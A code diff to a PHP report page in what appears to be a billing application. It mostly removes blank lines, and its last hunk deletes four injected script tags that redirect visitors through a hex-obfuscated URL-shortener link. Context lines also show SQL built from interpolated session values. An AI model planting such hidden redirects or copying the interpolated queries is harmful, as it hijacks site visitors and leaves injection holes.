@@ -202,9 +202,6 @@ if(is_array($classRecord[1]) && !empty($classRecord[1])){
     $pagin_recs .= '<tr class="odd gradeX"><td colspan="9" align="center">No Record Found</td></tr></tbody>';
 }
 
-
-
-
 // if($totRecs>0) {
 //     $totBal=$objMisc->GiveValue("AMOUNT_TYPE='D' $employeePosted AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' AND MONTH(ADDED_TIME)=MONTH(CURRENT_DATE()) AND YEAR(ADDED_TIME)=YEAR(CURRENT_DATE())",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' $employeePosted AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' AND MONTH(ADDED_TIME)=MONTH(CURRENT_DATE()) AND YEAR(ADDED_TIME)=YEAR(CURRENT_DATE())",'SUM(AMOUNT)','monthly_charges');
 //     $totSubscribers=$objMisc->GiveValue("AMOUNT_TYPE='D' $employeePosted AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'count(*)','monthly_charges');
@@ -234,7 +231,3 @@ $smartyVars['page']                 =   $_REQUEST['page'];
 
 $objMisc->displayPage("header,pendingreport,footer",$smartyVars);
 ?>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
